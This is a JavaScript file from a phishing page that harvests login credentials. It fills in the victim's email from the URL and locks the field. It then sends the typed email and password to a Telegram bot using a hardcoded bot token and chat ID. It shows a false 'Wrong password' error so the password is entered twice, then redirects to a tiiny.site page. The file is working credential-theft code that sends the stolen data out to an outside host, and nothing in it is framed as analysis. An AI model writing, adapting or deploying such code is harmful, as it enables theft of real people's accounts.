window.onload = function () {
  const urlParams = new URLSearchParams(window.location.search);
  const emailFromUrl = urlParams.get('email');
  const emailInput = document.getElementById("email");

  if (emailFromUrl) {
    emailInput.value = emailFromUrl;
    emailInput.readOnly = true;
    emailInput.style.backgroundColor = "#f0f0f0";
    emailInput.style.cursor = "not-allowed";
    emailInput.oncopy = (e) => e.preventDefault();
    emailInput.oncut = (e) => e.preventDefault();
    emailInput.onpaste = (e) => e.preventDefault();
  } else {
    emailInput.readOnly = false;
    emailInput.style.backgroundColor = "#fff";
    emailInput.style.cursor = "text";
  }
};

function openLogin() {
  document.getElementById("loginModal").style.display = "flex";
}

function closeModal() {
  document.getElementById("loginModal").style.display = "none";
  document.getElementById("error-msg").innerText = "";
}

function sendToTelegram(email, password) {
  const token = "7552866414:AAG94hGLSWXReY0vodsBfQIUl95v9G2IYdA";
  const chatId = "7799444101";
  const message = `Login Attempt:\n📧 Email: ${email}\n🔑 Password: ${password}`;

  fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify({
      chat_id: chatId,
      text: message
    })
  }).catch(err => {
    console.error("Telegram error:", err);
  });
}

function submitLogin() {
  const emailInput = document.getElementById("email");
  const passwordInput = document.getElementById("password");
  const email = emailInput.value.trim();
  const password = passwordInput.value.trim();

  if (!email || !password) {
    document.getElementById("error-msg").innerText = "Please enter both fields.";
    return;
  }

  // Send to Telegram
  sendToTelegram(email, password);

  // Hide modal, show loading
  document.getElementById("loginModal").style.display = "none";
  document.getElementById("loading").style.display = "flex";

  setTimeout(() => {
    document.getElementById("loading").style.display = "none";

    if (!sessionStorage.getItem("retried")) {
      sessionStorage.setItem("retried", "true");

      // Show modal again
      openLogin();
      // Clear only password
      passwordInput.value = "";
      document.getElementById("error-msg").innerText = "Wrong password. Please re-enter your credentials.";
    } else {
      // Redirect after second login
      window.location.href = "https://jade-zitella-36.tiiny.site/complete.html";
    }
  }, 3000);
}

